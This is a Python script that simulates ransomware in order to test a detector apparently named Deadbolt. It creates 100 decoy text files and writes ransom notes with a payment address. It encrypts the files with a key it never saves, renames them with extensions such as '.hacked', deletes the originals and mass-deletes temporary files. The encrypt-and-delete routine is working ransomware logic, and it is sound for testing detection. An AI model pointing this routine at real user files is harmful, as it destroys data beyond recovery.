"""
Comprehensive Ransomware Test - Medium Intensity
Creates test files and simulates advanced ransomware behavior with weird extensions
"""

import os
import time
import random
import threading
from cryptography.fernet import Fernet
import argparse

class ComprehensiveRansomwareTest:
    """Advanced ransomware simulation with comprehensive file operations."""
    
    def __init__(self, test_dir=r"C:\Users\MADHURIMA\Documents\testtxt", intensity='medium'):
        self.test_dir = test_dir
        self.intensity = intensity
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []
        
        # Weird extensions for testing
        self.weird_extensions = ['.xxx', '.zzz', '.666', '.virus', '.evil', '.hacked', '.ransom']
        
        # Behavior parameters for medium intensity
        self.params = {
            'file_count': 100,
            'delay': 0.3,
            'batch_size': 8,
            'encryption_batches': 10,
            'weird_extension_ratio': 0.7  # 70% will get weird extensions
        }
        
        print(f"🧪 Comprehensive Ransomware Test initialized:")
        print(f"  Test Directory: {self.test_dir}")
        print(f"  Intensity: {intensity}")
        print(f"  Target Files: {self.params['file_count']}")
        print(f"  Batch Size: {self.params['batch_size']}")
        
    def create_test_environment(self):
        """Create comprehensive test environment with 100 txt files."""
        print(f"\n📁 Creating test environment...")
        
        # Create test directory
        os.makedirs(self.test_dir, exist_ok=True)
        
        # Create 100 txt files with varied content
        file_types = [
            'document', 'report', 'notes', 'data', 'backup', 'config', 
            'log', 'script', 'readme', 'info', 'temp', 'cache'
        ]
        
        print(f"Creating {self.params['file_count']} test files...")
        
        for i in range(self.params['file_count']):
            file_type = random.choice(file_types)
            filename = f"{file_type}_{i:03d}.txt"
            filepath = os.path.join(self.test_dir, filename)
            
            # Create varied content
            content_lines = [
                f"File: {filename}",
                f"Created: {time.strftime('%Y-%m-%d %H:%M:%S')}",
                f"Type: {file_type}",
                f"Index: {i}",
                "Content: " + "Important data " * random.randint(5, 15),
                "This file contains critical information.",
                "Do not delete or modify this file.",
                "Additional data: " + "X" * random.randint(50, 200)
            ]
            
            try:
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write("\n".join(content_lines))
                    
                if (i + 1) % 20 == 0:
                    print(f"  Created {i + 1} files...")
                    
            except Exception as e:
                print(f"Error creating {filepath}: {e}")
        
        print(f"✅ Successfully created {self.params['file_count']} test files in {self.test_dir}")
        return self._get_all_files()
    
    def _get_all_files(self):
        """Get list of all files in test directory."""
        files = []
        try:
            for file in os.listdir(self.test_dir):
                filepath = os.path.join(self.test_dir, file)
                if os.path.isfile(filepath) and file.endswith('.txt'):
                    files.append(filepath)
        except Exception as e:
            print(f"Error listing files: {e}")
        return files
    
    def create_ransom_notes(self):
        """Create multiple ransom notes with variations."""
        print(f"\n📄 Creating RANSOM NOTES...")
        
        ransom_notes = [
            "DECRYPT_YOUR_FILES.txt",
            "HOW_TO_RESTORE_FILES.txt", 
            "RANSOM_INSTRUCTIONS.txt",
            "README_DECRYPT_NOW.txt",
            "HELP_RESTORE_DATA.txt",
            "PAYMENT_INFO.txt"
        ]
        
        ransom_content = f"""
YOUR FILES HAVE BEEN ENCRYPTED!

All your important files have been encrypted with military-grade encryption.
To recover your files, you need to pay the ransom fee.

PAYMENT INSTRUCTIONS:
1. Purchase Bitcoin worth $1000
2. Send to address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
3. Email us the transaction ID: recover@evil-ransomware.onion

WARNING:
- Do not try to decrypt files yourself
- Do not contact authorities  
- You have 48 hours to pay
- After 48 hours, the price doubles
- After 1 week, files will be permanently deleted

This is a TEST simulation for security testing purposes.
Generated at: {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        for note_name in ransom_notes:
            note_path = os.path.join(self.test_dir, note_name)
            try:
                with open(note_path, 'w', encoding='utf-8') as f:
                    f.write(ransom_content)
                print(f"  Created ransom note: {note_name}")
            except Exception as e:
                print(f"Error creating ransom note {note_name}: {e}")
    
    def simulate_mass_encryption_with_weird_extensions(self):
        """Simulate mass encryption with weird file extensions."""
        print(f"\n🔥 Starting MASS ENCRYPTION with WEIRD EXTENSIONS...")
        
        # Get all txt files
        all_files = self._get_all_files()
        if not all_files:
            print("❌ No files found to encrypt!")
            return
        
        print(f"Targeting {len(all_files)} files for encryption...")
        
        # Encrypt files in batches with weird extensions
        files_per_batch = max(1, len(all_files) // self.params['encryption_batches'])
        
        for batch_num in range(self.params['encryption_batches']):
            start_idx = batch_num * files_per_batch
            end_idx = min(start_idx + files_per_batch, len(all_files))
            
            # Skip if no files left
            if start_idx >= len(all_files):
                break
                
            batch_files = all_files[start_idx:end_idx]
            
            print(f"\n🔥 Encrypting batch {batch_num + 1}/{self.params['encryption_batches']}: {len(batch_files)} files")
            
            # Encrypt all files in this batch rapidly
            for filepath in batch_files:
                try:
                    self._encrypt_file_with_weird_extension(filepath)
                except Exception as e:
                    print(f"Error encrypting {filepath}: {e}")
            
            print(f"✅ Batch {batch_num + 1} encrypted successfully")
            
            # Small delay between batches to trigger mass modification detection
            time.sleep(self.params['delay'])
    
    def _encrypt_file_with_weird_extension(self, filepath):
        """Encrypt a single file and give it a weird extension."""
        try:
            # Read original file
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            # Encrypt the data
            encrypted_data = self.cipher.encrypt(file_data)
            
            # Choose a weird extension
            weird_ext = random.choice(self.weird_extensions)
            
            # Create new filename with weird extension
            if random.random() < self.params['weird_extension_ratio']:
                # 70% chance of weird extension
                encrypted_path = filepath + weird_ext
            else:
                # 30% chance of normal ransomware extension
                encrypted_path = filepath + '.encrypted'
            
            # Write encrypted data
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Remove original file
            os.remove(filepath)
            
            self.encrypted_files.append(encrypted_path)
            filename = os.path.basename(filepath)
            new_filename = os.path.basename(encrypted_path)
            print(f"    🔒 {filename} → {new_filename}")
            
        except Exception as e:
            print(f"    ❌ Error encrypting {filepath}: {e}")
    
    def simulate_file_destruction(self):
        """Simulate additional file destruction patterns."""
        print(f"\n🗑️ Simulating file destruction patterns...")
        
        # Create some temporary files and then delete them rapidly
        temp_files = []
        for i in range(10):
            temp_file = os.path.join(self.test_dir, f"temp_target_{i}.txt")
            try:
                with open(temp_file, 'w') as f:
                    f.write(f"Temporary file {i} for deletion test")
                temp_files.append(temp_file)
            except Exception as e:
                print(f"Error creating temp file: {e}")
        
        # Rapidly delete them to trigger mass deletion detection
        print(f"Rapidly deleting {len(temp_files)} files...")
        for temp_file in temp_files:
            try:
                os.remove(temp_file)
                print(f"  🗑️ Deleted: {os.path.basename(temp_file)}")
            except Exception as e:
                print(f"Error deleting {temp_file}: {e}")
            time.sleep(0.1)  # Very fast deletion
    
    def run_comprehensive_test(self):
        """Run the complete comprehensive ransomware test."""
        print("\n" + "="*70)
        print("🚨 STARTING COMPREHENSIVE RANSOMWARE SIMULATION 🚨")
        print("="*70)
        
        try:
            # Phase 1: Create test environment
            test_files = self.create_test_environment()
            if not test_files:
                print("❌ Failed to create test files. Aborting.")
                return
            
            print(f"\n⏳ Waiting 3 seconds for Deadbolt to start monitoring...")
            time.sleep(3)
            
            # Phase 2: Create ransom notes (should trigger suspicious filename detection)
            self.create_ransom_notes()
            time.sleep(1)
            
            # Phase 3: Mass encryption with weird extensions (should trigger mass modification + suspicious extension detection)
            self.simulate_mass_encryption_with_weird_extensions()
            time.sleep(2)
            
            # Phase 4: File destruction (should trigger mass deletion detection)
            self.simulate_file_destruction()
            
            print(f"\n✅ Comprehensive test completed!")
            print(f"📊 Summary:")
            print(f"  - Files encrypted: {len(self.encrypted_files)}")
            print(f"  - Weird extensions used: {', '.join(self.weird_extensions)}")
            print(f"  - Test directory: {self.test_dir}")
            
        except KeyboardInterrupt:
            print("\n⚠️ Test interrupted by user")
        except Exception as e:
            print(f"\n❌ Test error: {e}")
        finally:
            print("\n" + "="*70)
            print("🏁 COMPREHENSIVE RANSOMWARE TEST COMPLETED")
            print("="*70)
    
    def cleanup(self):
        """Clean up test files and directories."""
        print(f"\n🧹 Cleaning up test directory: {self.test_dir}")
        try:
            import shutil
            if os.path.exists(self.test_dir):
                shutil.rmtree(self.test_dir)
                print("✅ Cleanup completed successfully")
        except Exception as e:
            print(f"❌ Cleanup error: {e}")

def main():
    parser = argparse.ArgumentParser(description='Comprehensive Ransomware Test')
    parser.add_argument('--test-dir', default=r"C:\Users\MADHURIMA\Documents\testtxt",
                       help='Test directory path')
    parser.add_argument('--intensity', choices=['low', 'medium', 'high'], 
                       default='medium', help='Test intensity level')
    parser.add_argument('--cleanup', action='store_true', help='Clean up after test')
    parser.add_argument('--setup-only', action='store_true', help='Only create test files, no simulation')
    
    args = parser.parse_args()
    
    print("🧪 COMPREHENSIVE RANSOMWARE TEST - FOR SECURITY TESTING ONLY")
    print("⚠️  WARNING: This simulates advanced malicious behavior")
    print("   Use only in controlled environments!")
    print()
    
    test = ComprehensiveRansomwareTest(test_dir=args.test_dir, intensity=args.intensity)
    
    try:
        if args.setup_only:
            test.create_test_environment()
            print(f"\n📁 Test files created. Start Deadbolt, then run without --setup-only")
        else:
            test.run_comprehensive_test()
        
        if args.cleanup:
            input("\nPress Enter to clean up test files...")
            test.cleanup()
        else:
            print(f"\n📁 Test files are located at: {test.test_dir}")
            print("💡 Run with --cleanup to auto-clean")
            
    except KeyboardInterrupt:
        print("\n⚠️ Test interrupted")
    except Exception as e:
        print(f"\n❌ Error: {e}")

if __name__ == "__main__":
    main()
